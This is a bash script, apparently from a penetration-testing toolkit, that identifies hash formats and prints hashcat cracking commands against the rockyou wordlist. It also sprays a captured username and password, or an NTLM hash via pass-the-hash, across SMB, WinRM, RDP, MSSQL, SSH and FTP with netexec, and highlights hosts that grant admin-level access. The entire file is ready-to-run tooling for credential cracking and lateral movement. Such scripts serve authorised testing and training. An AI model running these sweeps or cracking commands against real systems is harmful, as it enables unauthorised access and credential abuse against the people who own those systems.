#!/usr/bin/env bash
# hashid-credcheck.sh -- two small utilities in one:
#   hash <string-or-file>            identify hash format, echo the hashcat -m mode to use
#   cred <target_or_range> <u> <p>   sweep a found credential across smb/winrm/rdp/mssql/ssh/ftp
#                                     via nxc (notes/password-attacks-advanced.md's "Credential
#                                     Reuse" section) to see where else it works
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib/hashmodes.sh
source "$SCRIPT_DIR/lib/hashmodes.sh"

usage() {
    cat >&2 <<EOF
Usage:
  $0 hash <string-or-file>
  $0 cred <target_or_range> <user> <pass_or_hash>
EOF
    exit 1
}

SUBCMD="${1:-}"
[[ -z "$SUBCMD" ]] && usage
shift

case "$SUBCMD" in
    hash)
        INPUT="${1:-}"
        [[ -z "$INPUT" ]] && usage
        if [[ -f "$INPUT" ]]; then
            echo "[*] Reading hashes from file: $INPUT"
            declare -A MODES_SEEN=()
            while IFS= read -r line; do
                [[ -z "$line" ]] && continue
                IFS='|' read -r mode label <<<"$(detect_hash_mode "$line")"
                if [[ "$mode" == "unknown" ]]; then
                    echo "  ? ${line:0:50}...  -- unrecognized format, check CHEATSHEET.md §4 manually"
                elif [[ -z "${MODES_SEEN[$mode]:-}" ]]; then
                    MODES_SEEN[$mode]="$label"
                    echo "  $mode  ${label}"
                fi
            done < "$INPUT"
            echo
            if [[ ${#MODES_SEEN[@]} -eq 1 ]]; then
                for mode in "${!MODES_SEEN[@]}"; do
                    echo "hashcat -m $mode \"$INPUT\" /usr/share/wordlists/rockyou.txt"
                done
            elif [[ ${#MODES_SEEN[@]} -gt 1 ]]; then
                echo "[!] Multiple hash types found in this file -- split them into separate per-type"
                echo "    files before running hashcat (a single -m run rejects lines that don't match)."
                for mode in "${!MODES_SEEN[@]}"; do
                    echo "  mode $mode: grep -E '<pattern for this type>' \"$INPUT\" > mode_${mode}.hash"
                done
            fi
        else
            IFS='|' read -r mode label <<<"$(detect_hash_mode "$INPUT")"
            if [[ "$mode" == "unknown" ]]; then
                echo "[!] Could not identify this hash format. Check CHEATSHEET.md §4 manually." >&2
                exit 1
            fi
            echo "Mode: $mode ($label)"
            echo "hashcat -m $mode '$INPUT' /usr/share/wordlists/rockyou.txt"
        fi
        ;;

    cred)
        TARGET="${1:-}"
        USER="${2:-}"
        SECRET="${3:-}"
        if [[ -z "$TARGET" || -z "$USER" || -z "$SECRET" ]]; then
            usage
        fi
        if ! command -v nxc >/dev/null 2>&1; then
            echo "[!] nxc (netexec) not found. pipx install git+https://github.com/Pennyw0rth/NetExec" >&2
            exit 1
        fi

        AUTH_FLAG="-p"
        if [[ "$SECRET" =~ ^[0-9a-fA-F]{32}$ ]]; then
            AUTH_FLAG="-H"
            echo "[*] Input looks like an NTLM hash -- using pass-the-hash (-H)."
        fi

        echo "[*] Sweeping $USER against $TARGET across smb/winrm/rdp/mssql/ssh/ftp"
        for proto in smb winrm rdp mssql ssh ftp; do
            echo "--- $proto ---"
            OUTPUT="$(nxc "$proto" "$TARGET" -u "$USER" "$AUTH_FLAG" "$SECRET" 2>&1)"
            echo "$OUTPUT"
            if grep -qi 'Pwn3d!' <<<"$OUTPUT"; then
                echo "  *** (Pwn3d!) admin-equivalent access on $proto -- prioritize this ***"
            fi
        done
        ;;

    *)
        usage
        ;;
esac
